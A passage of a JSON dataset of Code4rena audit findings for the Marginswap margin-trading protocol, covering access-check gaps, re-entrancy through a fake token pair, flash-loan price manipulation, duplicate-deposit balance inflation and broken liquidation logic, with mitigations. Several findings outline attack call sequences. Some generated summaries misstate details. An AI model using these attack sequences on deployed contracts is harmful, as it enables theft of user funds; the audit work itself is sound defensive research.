      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/67",
      "tags": [],
      "finders": []
    },
    {
      "id": "3870",
      "title": "[M-05] Several function have no entry check",
      "impact": "MEDIUM",
      "content": "\nThe following functions have no entry check or a trivial entry check:\n\n```solidity\nwithdrawHourlyBond Lending.sol\ncloseHourlyBondAccount Lending.sol\nhaircut Lending.sol\naddDelegate(own adress...) Admin.sol\nremoveDelegate(own adress...) Admin.sol\ndepositStake Admin.sol\ndisburseLiqStakeAttacks CrossMarginLiquidation.sol\ndisburseLiqStakeAttacks IsolatedMarginLiquidation.sol\ngetCurrentPriceInPeg PriceAware.sol\n```\n\nBy manipulating the input values (for example extremely large values), you might be able to disturb the internal administration of the contract, thus perhaps locking function or giving wrong rates.\n\nRecommend checking the functions to see if they are completely risk free and add entry checks if they are not, and add a comment to notify the function is meant to be called by everyone.\n\n**[werg (Marginswap)](https://github.com/code-423n4/2021-04-marginswap-findings/issues/9#issuecomment-813043345):**\n\n> - `withdrawHourlyBond`: could not find vulnerability, since solidity 0.8.x fails on underflow in HourlyBondSubscriptionLending.sol:115 in case of unauthorized access.\n> - `closeHourlyBondAccount`: same story since both call into `_withdrawHourlyBond`\n> - `haircut`: trivially guarded in one way, though this actually has merit in another way -- if at some point down the road an attacker were able to establish a token, make it popular enough for us to add it to cross margin, but include in that token contract a malicious function that calls haircut, they could then void everybody's bonds in their token. I don't see how it would be profitable, it's definitely an expensive long con, but... we should add an extra guard to make sure it's an isolated margin trading contract.\n> - `addDelegate` has a guard.\n> - `removeDelegate` has a guard as well, or am I missing something here?\n> - `depositStake` fails for unfunded requests in the safe transfer in `Fund.depositFor`\n> - `disburseLiqStakeAttacks` should be universally accessible by design\n> - `getCurrentPriceInPeg` only updates state in a rate limited way, hence fine for it to be public\n>\n> I will add comments to the effect. Thanks again\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract. The vulnerability is in eight different functions, which have either no entry check or a trivial one. These functions are withdrawHourlyBond, closeHourlyBondAccount, haircut, addDelegate, removeDelegate, depositStake, disburseLiqStakeAttacks, and getCurrentPriceInPeg. All of these functions are located in either the Lending.sol, Admin.sol, or PriceAware.sol files. \n\nThe impact of this vulnerability is that by manipulating the input values, it is possible to disturb the internal administration of the contract, which could potentially lock functions or give wrong rates. The function haircut is only trivially vulnerable, so it is not considered to be a high risk. \n\nThe recommended mitigation steps for this vulnerability are to check the functions to see if they are completely risk free, and if not, to add entry checks. Additionally, a comment should be added to notify others that the function is meant to be called by everyone. \n\nThe proof of concept for this vulnerability is a source code review. A real attack, however, would require the deployed code to be able to construct the right values.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/9",
      "tags": [],
      "finders": []
    },
    {
      "id": "3869",
      "title": "[M-04] maintainer can be pushed out",
      "impact": "MEDIUM",
      "content": "\nThe function liquidate (in both `CrossMarginLiquidation.sol` and `IsolatedMarginLiquidation.sol`) can be called by everyone. If an attacker calls this repeatedly then the maintainer will be punished and eventually be reported as maintainerIsFailing\nAnd then the attacker can take the payouts.\n\nWhen a non authorized address repeatedly calls liquidate then the following happens: `isAuthorized = false` which means `maintenanceFailures[currentMaintainer]` increases. After sufficient calls it will be higher than the threshold and then\n`maintainerIsFailing()` will be true. This results in `canTakeNow` being true, which finally means the following will be executed:\n\n`Fund(fund()).withdraw(PriceAware.peg, msg.sender, maintainerCut);`\n\nAn attacker can push out a maintainer and take over the liquidation revenues.\n\nRecommend put authorization on who can call the liquidate function, review the maintainer punishment scheme.\n\n**[werg (Marginswap) disputed](https://github.com/code-423n4/2021-04-marginswap-findings/issues/5#issuecomment-813044805):**\n\n> I believe this issue is not a vulnerability, due to the checks in lines 326-335. Even if someone comes in first and claims the maintainer is failing they can do their job in the same or next block and get all / most of their failure record extinguished.\n\n**[zscole (Judge)](https://github.com/code-423n4/2021-04-marginswap-findings/issues/5#issuecomment-824102934):**\n\n> Acknowledging feedback from @werg, but maintaining the reported risk level of `medium` since this has implications on token logic.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the CrossMarginLiquidation.sol and IsolatedMarginLiquidation.sol functions. The function liquidate can be called by anyone, even by an attacker. If an attacker calls this repeatedly, the maintainer will be punished and eventually reported as maintainerIsFailing. This will allow the attacker to take the payouts. The attacker can push out the maintainer and take over the liquidation revenues. The tools used to identify this vulnerability were Remix. The recommended mitigation steps are to put authorization on who can call the liquidate function and to review the maintainer punishment scheme.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/5",
      "tags": [],
      "finders": []
    },
    {
      "id": "3868",
      "title": "[M-03] No entry checks in crossSwap[Exact]TokensFor[Exact]Tokens",
      "impact": "MEDIUM",
      "content": "\nThe functions crossSwapTokensForExactTokens and crossSwapExactTokensForTokens of MarginRouter.sol do not check who is calling the function. They also do not check the contents of pairs and tokens nor do they check if the size of pairs and tokens is the same.\n\n`registerTradeAndBorrow` within `registerTrade` does seem to do an entry check (require(isMarginTrader(msg.sender)...) however as this is an external function msg.sender is the address of MarginRouter.sol, which will verify ok.\n\nCalling these functions allow the caller to trade on behalf of marginswap, which could result in losing funds. It's possible to construct all parameters to circumvent the checks. Also the \"pairs\" can be fully specified; they are contract addresses that are called from getAmountsIn / getAmountsOut and from pair.swap. This way you can call arbitrary (self constructed) code, which can reentrantly call the marginswap code.\n\nRecommend limiting who can call the functions. Perhaps whitelist contents of pairs and tokens. Check the size of pairs and tokens is the same.\n\n**[werg (Marginswap) confirmed](https://github.com/code-423n4/2021-04-marginswap-findings/issues/4#issuecomment-813047489):**\n\n> This has merit: particularly the part about self-constructed pairs. We either need much more rigorous checks or a a process for vetting & approving pairs. The latter is likely more gas efficient.\n\n",
      "summary": "\nA security vulnerability was identified in the functions crossSwapTokensForExactTokens and crossSwapExactTokensForTokens of MarginRouter.sol. These functions do not check who is calling the function or the contents of pairs and tokens. In addition, they do not check if the size of pairs and tokens is the same. This means that anyone can call the functions and trade on behalf of marginswap, resulting in the potential loss of funds. A proof of concept was created using remix, and recommended mitigation steps are to limit who can call the functions, whitelist the contents of pairs and tokens, and check the size of pairs and tokens is the same.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/4",
      "tags": [],
      "finders": []
    },
    {
      "id": "3867",
      "title": "[M-02] Missing checks if pairs equal tokens",
      "impact": "MEDIUM",
      "content": "\nThe `UniswapStyleLib.getAmountsOut`, `PriceAware.setLiquidationPath` (and others) don't check that `path.length + 1 == tokens.length` which should always hold true. Also, it does not check that the tokens actually match the pair. It's easy to set faulty liquidation paths which then end up reverting the liquidation transactions.\n\n",
      "summary": "\nThis bug report is about an issue with the UniswapStyleLib.getAmountsOut and PriceAware.setLiquidationPath functions. These functions do not check that the length of the path is equal to the length of the tokens, which should always be true. Furthermore, it does not check if the tokens actually match the pair. This means it is easy to set faulty liquidation paths, which will then cause the liquidation transactions to revert. The recommended mitigation steps are to add the missing checks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/29",
      "tags": [],
      "finders": []
    },
    {
      "id": "3866",
      "title": "[M-01] No default liquidationThresholdPercent",
      "impact": "MEDIUM",
      "content": "## Email address\n\nmail@cmichel.io\n\n\n## Handle\n\n@cmichelio\n\n\n## Eth address\n\n0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad\n\n\n## Vulnerability details\n\nThe `IsolatedMarginTrading` contract does not define a default `liquidationThresholdPercent` which means it is set to 0.\n\nThe `belowMaintenanceThreshold` function uses this value and anyone could be liquidated due to `100 * holdings >= liquidationThresholdPercent * loan = 0` being always true.\n\n\n\n## Impact\n\nAnyone can be liquidated immediately.\nIf the faulty `belowMaintenanceThreshold` function is fixed (see other issue), then nobody could be liquidated which is bad as well.\n\n\n\n## Recommended mitigation steps\n\nSet a default liquidation threshold like in `CrossMarginTrading` contracts.",
      "summary": "\nThis bug report is about the `IsolatedMarginTrading` contract which does not have a default `liquidationThresholdPercent` set. This means that the `belowMaintenanceThreshold` function is always true, allowing anyone to be liquidated immediately. The recommended mitigation step is to set a default liquidation threshold, like the one in `CrossMarginTrading` contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/28",
      "tags": [],
      "finders": []
    },
    {
      "id": "3865",
      "title": "[H-11] Impossible to call withdrawReward fails due to run out of gas",
      "impact": "HIGH",
      "content": "## Handle\n\ns1m0\n\n\n## Vulnerability details\n\n## Impact\nThe withdrawReward (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L224) fails due to the loop at https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L269.\nFrom my testing the dayDiff would be 18724 and with a gasLimit of 9500000 it stops at iteration 270 due to the fact that lastUpdatedDay is not initialized so is 0.\nOther than that it could run out of gas also for the loop of allTranches (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L281) because it's an unbounded array.\n\n## Proof of Concept\nThis is a test with hardhat.\n\nconst { ethers } = require(\"hardhat\");\n\ndescribe(\"MarginSwap\", function() {\n    let IncentiveDistribution, incentiveDistribution;\n    let owner;\n    \n    before(async function() {\n        [owner] = await ethers.getSigners();\n        IncentiveDistribution = await ethers.getContractFactory(\"IncentiveDistribution\");\n        incentiveDistribution = await IncentiveDistribution.deploy(ethers.constants.AddressZero, 2);\n    });\n\n    it(\"withdrawReward\", async function() {\n        await incentiveDistribution.initTranche(1, 23);\n        await incentiveDistribution.addToClaimAmount(1, owner.address, 324234);\n        await incentiveDistribution.withdrawReward([1], {gasLimit: 9500000});\n    });\n});\n\nNote: from the IncentiveDistribution contract i removed the inheritance of RoleAware and Ownable for convenience of testing and added some print with console.log() to check where it stops.\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nI'm not sure of the logic behind the shrinking of the daily distribution but i think that maybe you just missed to initialize the lastUpdatedDay to the day of deployment?\nIf that's the case it resolves partially the problem because allTranches is theoretically unbounded even though only the owner can add element to it and you should do deeply testing to understand how many elements it can have until it run out of gas.\nI read the comment that says you tried to shift the gas to the withdrawal people maybe you went too further and is it worth rethinking the design?",
      "summary": "\nThis bug report is about a vulnerability in the withdrawReward function of the IncentiveDistribution smart contract. This vulnerability is caused by a loop at https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L269, which runs out of gas due to the fact that lastUpdatedDay is not initialized. Additionally, the unbounded array of allTranches (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L281) can also run out of gas. The bug was tested with hardhat and the recommended mitigation steps are to initialize the lastUpdatedDay to the day of deployment and to rethink the design.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/65",
      "tags": [],
      "finders": []
    },
    {
      "id": "3864",
      "title": "[H-09] lastUpdatedDay not initialized",
      "impact": "HIGH",
      "content": "\nThe variable lastUpdatedDay in IncentiveDistribution.sol is not (properly) initialized. This means the function updateDayTotals will end up in a very large loop which will lead to an out of gas error. Even if the loop would end, the variable currentDailyDistribution would be updated very often. Thus updateDayTotals cannot be performed.\n\nThe entire IncentiveDistribution does not work. If the loop would stop, the variable currentDailyDistribution is not accurate, resulting in a far lower incentive distribution than expected.\n\nRecommend initializing lastUpdatedDay with something like block.timestamp / (1 days)\n\n```solidity\nuint256 lastUpdatedDay; # ==> lastUpdatedDay = 0\n\n",
      "summary": "\nA bug was reported in the IncentiveDistribution.sol file, which is a part of a smart contract. The variable lastUpdatedDay in the file is not initialized, which causes the function updateDayTotals to enter a very large loop. This loop will eventually lead to an out of gas error. Even if the loop would end, the variable currentDailyDistribution would be inaccurate, resulting in a lower incentive distribution than expected. The impact of this bug is that the entire IncentiveDistribution will not work. The recommended mitigation step is to initialize lastUpdatedDay with something like block.timestamp / (1 days). A proof of concept has been provided to demonstrate the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/14",
      "tags": [],
      "finders": []
    },
    {
      "id": "3863",
      "title": "[H-08] Rewards cannot be withdrawn",
      "impact": "HIGH",
      "content": "\nThe rewards for a recipient in `IncentiveDistribution.sol` are stored in the storage mapping indexed by recipient `accruedReward[recipient]` and the recipient is the actual margin trader account, see `updateAccruedReward`.\n\nThese rewards are supposed to be withdrawn through the `withdrawReward` function but `msg.sender` is used here instead of a `recipient` (`withdrawer`) parameter.\nHowever, `msg.sender` is enforced to be the incentive reporter and can therefore not be the margin trader.\n\nNobody can withdraw the rewards.\n\nRecommend removing the ` isIncentiveReporter(msg.sender)` check from `withdrawReward` function.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the IncentiveDistribution.sol contract. The rewards for a recipient are stored in the storage mapping indexed by the recipient, however, the rewards can only be withdrawn by the incentive reporter and not by the margin trader. This means that nobody can withdraw the rewards and the bug has an impact on the contract. The recommended mitigation step to solve this bug is to remove the `isIncentiveReporter(msg.sender)` check from the `withdrawReward` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/26",
      "tags": [],
      "finders": []
    },
    {
      "id": "3862",
      "title": "[H-07] account.holdsToken is never set",
      "impact": "HIGH",
      "content": "## Email address\n\nmail@cmichel.io\n\n\n## Handle\n\n@cmichelio\n\n\n## Eth address\n\n0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad\n\n\n## Vulnerability details\n\nThe `addHolding` function does not update the `account.holdsToken` map.\n\n```solidity\nfunction addHolding(\n    CrossMarginAccount storage account,\n    address token,\n    uint256 depositAmount\n) internal {\n    if (!hasHoldingToken(account, token)) {\n        // SHOULD SET account.holdsToken here\n        account.holdingTokens.push(token);\n    }\n\n    account.holdings[token] += depositAmount;\n}\n```\n\nThis leads to a critical vulnerability where deposits of the same token keep being pushed to the `account.holdingTokens` array but the sum is correctly updated in `account.holdings[token]`.\n\nHowever, because of the duplicate token in the `holdingTokens` array the same token is counted several times in the `getHoldingAmounts` function:\n\n```solidity\nfunction getHoldingAmounts(address trader)\n    external\n    view\n    override\n    returns (\n        address[] memory holdingTokens,\n        uint256[] memory holdingAmounts\n    )\n{\n    CrossMarginAccount storage account = marginAccounts[trader];\n    holdingTokens = account.holdingTokens;\n\n    holdingAmounts = new uint256[](account.holdingTokens.length);\n    for (uint256 idx = 0; holdingTokens.length > idx; idx++) {\n        address tokenAddress = holdingTokens[idx];\n        // RETURNS SUM OF THE BALANCE FOR EACH TOKEN ENTRY\n        holdingAmounts[idx] = account.holdings[tokenAddress];\n    }\n}\n```\n\nThe `MarginRouter.crossCloseAccount` function uses these wrong amounts to withdraw all tokens:\n\n```solidity\nfunction crossCloseAccount() external {\n    (address[] memory holdingTokens, uint256[] memory holdingAmounts) =\n        IMarginTrading(marginTrading()).getHoldingAmounts(msg.sender);\n\n    // requires all debts paid off\n    IMarginTrading(marginTrading()).registerLiquidation(msg.sender);\n\n    for (uint256 i; holdingTokens.length > i; i++) {\n        Fund(fund()).withdraw(\n            holdingTokens[i],\n            msg.sender,\n            holdingAmounts[i]\n        );\n    }\n}\n```\n\n\n\n## Impact\n\nAn attacker can just deposit the same token X times which increases their balance by X times the actual value.\nThis inflated balance can then be withdrawn to steal all tokens.\n\n\n## Recommended mitigation steps\n\nCorrectly set the `account.holdsToken` map in `addHolding`.",
      "summary": "\nThis bug report describes a vulnerability in the `addHolding` function of the CrossMarginAccount contract. This function is responsible for updating the `account.holdsToken` map, but it does not do so correctly. As a result, the same token is counted multiple times in the `getHoldingAmounts` function, leading to an inflated balance. This can then be withdrawn using the `crossCloseAccount` function, allowing an attacker to steal all tokens. The recommended mitigation step is to correctly set the `account.holdsToken` map in the `addHolding` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/25",
      "tags": [],
      "finders": []
    },
    {
      "id": "3861",
      "title": "[H-06] Users are credited more tokens when paying back debt with registerTradeAndBorrow",
      "impact": "HIGH",
      "content": "## Email address\n\nmail@cmichel.io\n\n\n## Handle\n\n@cmichelio\n\n\n## Eth address\n\n0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad\n\n\n## Vulnerability details\n\nThe `registerTradeAndBorrow` is called with the results of a trade (`inAmount`, `outAmount`). It first tries to pay back any debt with the `outAmount`.\nHowever, the **full** `outAmount` is credited to the user again as a deposit in the `adjustAmounts(account, tokenFrom, tokenTo, sellAmount, outAmount);` call.\n\n\n## Impact\n\nAs the user pays back their debt and is credited the same amount again, they are essentially credited twice the `outAmount`, making a profit of one `outAmount`.\nThis can be withdrawn and the process can be repeated until the funds are empty.\n\n\n## Recommended mitigation steps\n\nIn the `adjustAmounts` call, it should only credit `outAmount - extinguishableDebt` as a deposit like in `registerDeposit`.\nThe `registerDeposit` function correctly handles this case.",
      "summary": "\nA bug report has been submitted for the `registerTradeAndBorrow` function. The bug allows a user to essentially be credited twice the `outAmount`, making a profit of one `outAmount` and withdraw the funds before repeating the process. This is due to the `adjustAmounts` call crediting the full `outAmount` to the user again as a deposit. The recommended mitigation step is to only credit `outAmount - extinguishableDebt` as a deposit like in `registerDeposit` which correctly handles this case.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/24",
      "tags": [],
      "finders": []
    },
    {
      "id": "3860",
      "title": "[H-05] Wrong liquidation logic",
      "impact": "HIGH",
      "content": "\nThe `belowMaintenanceThreshold` function decides if a trader can be liquidated:\n\n```solidity\nfunction belowMaintenanceThreshold(CrossMarginAccount storage account)\n    internal\n    returns (bool)\n{\n    uint256 loan = loanInPeg(account, true);\n    uint256 holdings = holdingsInPeg(account, true);\n    // The following should hold:\n    // holdings / loan >= 1.1\n    // =>\n    return 100 * holdings >= liquidationThresholdPercent * loan;\n}\n```\n\nThe inequality in the last equation is wrong because it says the higher the holdings (margin + loan) compared to the loan, the higher the chance of being liquidated. The inverse equality was probably intended `return 100 * holdings <= liquidationThresholdPercent * loan;`. Users that shouldn't be liquidated can be liquidated, and users that should be liquidated cannot get liquidated.\n\n",
      "summary": "\nThis bug report is about an Ethereum address (0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad) and a vulnerability in the `belowMaintenanceThreshold` function. The inequality in the last equation is wrong because it says the higher the holdings (margin + loan) compared to the loan, the higher the chance of being liquidated; the inverse equality was probably intended. The impact of this bug is that users that shouldn't be liquidated can be liquidated, and users that should be liquidated cannot get liquidated. The recommended mitigation step is to fix the equation. The reporter of this bug is mail@cmichel.io and @cmichelio.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/23",
      "tags": [],
      "finders": []
    },
    {
      "id": "3859",
      "title": "[H-04] Inconsistent usage of applyInterest",
      "impact": "HIGH",
      "content": "## Email address\n\npauliax6@gmail.com\n\n\n## Handle\n\npaulius.eth\n\n\n## Eth address\n\n0x523B5b2Cc58A818667C22c862930B141f85d49DD\n\n\n## Vulnerability details\n\nIt is unclear if the function applyInterest is supposed to return a new balance with the interest applied or only the accrued interest? There are various usages of it, some calls add the return value to the old amount:\nreturn\n    bond.amount +\n    applyInterest(bond.amount, cumulativeYield, yieldQuotientFP);\nand some not:\n\n   balanceWithInterest = applyInterest(\n            balance,\n            yA.accumulatorFP,\n            yieldQuotientFP\n        );\n\n\n## Impact\n\nThis makes the code misbehave and return the wrong values for the balance and accrued interest.\n\n\n## Recommended mitigation steps\n\nMake it consistent in all cases when calling this function.",
      "summary": "\nA bug report has been reported regarding the function applyInterest. It is unclear if the function is supposed to return a new balance with the interest applied or only the accrued interest. This inconsistency in usage leads to wrong values for the balance and accrued interest. The recommended mitigation step is to make it consistent in all cases when calling this function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/64",
      "tags": [],
      "finders": []
    },
    {
      "id": "3858",
      "title": "[H-03] Price feed can be manipulated",
      "impact": "HIGH",
      "content": "\nAnyone can trigger an update to the price feed by calling `PriceAware.getCurrentPriceInPeg(token, inAmount, forceCurBlock=true)`.\nIf the update window has passed, the price will be computed by simulating a Uniswap-like trade with the amounts.\nThis simulation uses the reserves of the Uniswap pairs which can be changed drastically using flash loans to yield almost arbitrary output amounts, and thus prices. Wrong prices break the core functionality of the contracts such as borrowing on margin, liquidations, etc.\n\nRecommend against using the Uniswap spot price as the real price. Uniswap itself warns against this and instead recommends implementing a [TWAP price oracle](https://uniswap.org/docs/v2/smart-contract-integration/building-an-oracle/) using the `price*CumulativeLast` variables.\n\n",
      "summary": "\nThis bug report outlines an issue with the `PriceAware.getCurrentPriceInPeg(token, inAmount, forceCurBlock=true)` function. This function is used to trigger an update to the price feed, but if the update window has passed, the price will be computed by simulating a Uniswap-like trade with the amounts. Unfortunately, this simulation can be manipulated using flash loans to yield almost arbitrary output amounts, and thus prices. \n\nThis bug has the potential to cause serious issues, as wrong prices can break the core functionality of the contracts such as borrowing on margin, liquidations, etc.\n\nTo mitigate this issue, it is recommended to not use the Uniswap spot price as the real price and instead implement a Time-Weighted Average Price (TWAP) price oracle using the `price*CumulativeLast` variables. Uniswap itself warns against using the spot price and recommends implementing a TWAP price oracle instead.\n\nThe bug report was submitted by @cmichelio (mail@cmichel.io) with the Ethereum address 0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/21",
      "tags": [],
      "finders": []
    },
    {
      "id": "3857",
      "title": "[H-02] Missing fromToken != toToken check",
      "impact": "HIGH",
      "content": "## Email address\n\nmail@cmichel.io\n\n\n## Handle\n\n@cmichelio\n\n\n## Eth address\n\n0x6823636c2462cfdcD8d33fE53fBCD0EdbE2752ad\n\n\n## Vulnerability details\n\nAttacker calls `MarginRouter.crossSwapExactTokensForTokens` with a fake pair and the same token[0] == tokne[1].\n`crossSwapExactTokensForTokens(1000 WETH, 0, [ATTACKER_CONTRACT], [WETH, WETH])`. When the amounts are computed by the `amounts = UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens);` call, the attacker contract returns fake reserves that yield 0 output\nWhen `_swapExactT4T` is called, the funds are sent to the fake contract and doing nothing passes all checks in `_swap` call that follows because the `startingBalance` is stored _after_ the initial Fund withdraw to the pair.\n\n```solidity\nfunction _swapExactT4T() {\n  // withdraw happens here\n    Fund(fund()).withdraw(tokens[0], pairs[0], amounts[0]);\n    _swap(amounts, pairs, tokens, fund());\n}\n\nfunction _swap() {\n  uint256 startingBalance = IERC20(outToken).balanceOf(_to);\n  uint256 endingBalance = IERC20(outToken).balanceOf(_to);\n  // passes as startingBalance == endingBalance + 0\n  require(\n      endingBalance >= startingBalance + amounts[amounts.length - 1],\n      \"Defective AMM route; balances don't match\"\n  );\n}\n```\n\n\n## Impact\n\nThe full impact is not yet known as `registerTrade` could still fail when subtracting the `inAmount` and adding 0 `outAmount`.\nAt least, this attack is similar to a withdrawal which is supposed to only occur after a certain `coolingOffPeriod` has passed, but this time-lock is circumvented with this attack.\n\n\n## Recommended mitigation steps\n\nMove the fund withdrawal to the first pair **after** the `startingBalance` assignment.\nCheck `fromToken != toToken` as cyclical trades (arbitrages) are likely not what margin traders are after.\nConsider if the same check is required for `registerTradeAndBorrow` / `adjustAmounts` functions.",
      "summary": "\nThis bug report is about a vulnerability found in the MarginRouter contract. The attacker calls the `MarginRouter.crossSwapExactTokensForTokens` function with a fake pair and the same token[0] == tokne[1]. This causes the amounts to be computed by the `amounts = UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens);` call to return fake reserves that yield 0 output. When the `_swapExactT4T` is called, the funds are sent to the fake contract and doing nothing passes all checks in the `_swap` call that follows because the `startingBalance` is stored _after_ the initial Fund withdraw to the pair.\n\nThe full impact of this vulnerability is not yet known, but it is similar to a withdrawal which is supposed to only occur after a certain `coolingOffPeriod` has passed, but this time-lock is circumvented with this attack. The recommended mitigation steps are to move the fund withdrawal to the first pair **after** the `startingBalance` assignment, check `fromToken != toToken` as cyclical trades (arbitrages) are likely not what margin traders are after, and consider if the same check is required for `registerTradeAndBorrow` / `adjustAmounts` functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "3856",
      "title": "[H-01] Re-entrancy bug allows inflating balance",
      "impact": "HIGH",
      "content": "\n\nOne can call the `MarginRouter.crossSwapExactTokensForTokens` function first with a fake contract disguised as a token pair:\n`crossSwapExactTokensForTokens(0.0001 WETH, 0, [ATTACKER_CONTRACT], [WETH, WBTC])`. When the amounts are computed by the `amounts = UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens);` call, the attacker contract returns fake reserves that yield 1 WBTC for the tiny input. The resulting amount is credited through `registerTrade`. Afterwards, `_swapExactT4T([0.0001 WETH, 1 WBTC], 0, [ATTACKER_CONTRACT], [WETH, WBTC])` is called with the fake pair and token amounts. At some point `_swap` is called, the starting balance is stored in `startingBalance`, and the attacker contract call allows a re-entrancy:\n\n```solidity\npair.swap(0.0001 WETH, 1 WBTC, FUND, new bytes(0)); // can re-enter here\n```\n\nFrom the ATTACKER_CONTRACT we re-enter the `MarginRouter.crossSwapExactTokensForTokens(30 WETH, 0, WETH_WBTC_PAIR, [WETH, WBTC])` function with the actual WETH <> WBTC pair contract. All checks pass, the FUND receives the actual amount, the outer `_swap` continues execution after the re-entrancy and the `endingBalance >= startingBalance + amounts[amounts.length - 1]` check passes as well because the inner swap successfully deposited these funds. We end up doing 1 real trade but being credited twice the output amount.\n\nThis allows someone to be credited multiples of the actual swap result. This can be repeated many times and finally, all tokens can be stolen.\n\nRecommend adding re-entrancy guards (from OpenZeppelin) to all external functions of `MarginRouter`. There might be several attack vectors of this function as the attacker controls many parameters. The idea of first doing an estimation with `UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens)` and updating the user with these estimated amounts, before doing the actual trade, feels quite vulnerable to me. Consider removing the estimation and only doing the actual trade first, then calling `registerTrade` with the actual trade amounts returned.\n\n",
      "summary": "\nA bug was identified in the MarginRouter.crossSwapExactTokensForTokens function of the Ethereum blockchain. An attacker can call the function with a fake contract disguised as a token pair and return fake reserves that yield 1 WBTC for a tiny input. This allows the attacker to be credited multiples of the actual swap result. This can be repeated many times and eventually, all tokens can be stolen. \n\nThe recommended mitigation steps are to add re-entrancy guards (from OpenZeppelin) to all external functions of MarginRouter and to remove the estimation and only do the actual trade first, then calling registerTrade with the actual trade amounts returned.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/19",
      "tags": [],
      "finders": []
    },
    {
      "id": "10962",
      "title": "[L15] README file is empty",
      "impact": "LOW",
